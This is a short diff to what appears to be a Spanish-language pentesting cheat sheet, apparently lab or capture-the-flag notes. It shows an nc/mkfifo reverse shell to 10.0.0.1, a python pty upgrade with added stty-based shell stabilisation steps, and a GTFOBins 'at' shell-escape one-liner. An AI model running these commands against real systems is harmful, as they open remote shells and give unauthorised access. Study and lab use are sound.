@@ -31,7 +31,7 @@
     - si `nc` no soporte la opcion `-e`: 
         - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
     - si se conecta usamos:
-        - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+        - `python3 -c 'import pty;pty.spawn("/bin/bash")'` luego Presionar `Ctrl+Z` e ingresar `stty raw -echo`. Posteriormente ingresar `fg` y presionar ENTER dos veces y regresara al reverse shell pero podremos usar ctrl+c y ctrl+z
 
     - si usamos `sudo -l` y no funciona usamos:
         - [GTFObins](https://gtfobins.github.io/gtfobins/at/) `echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null`
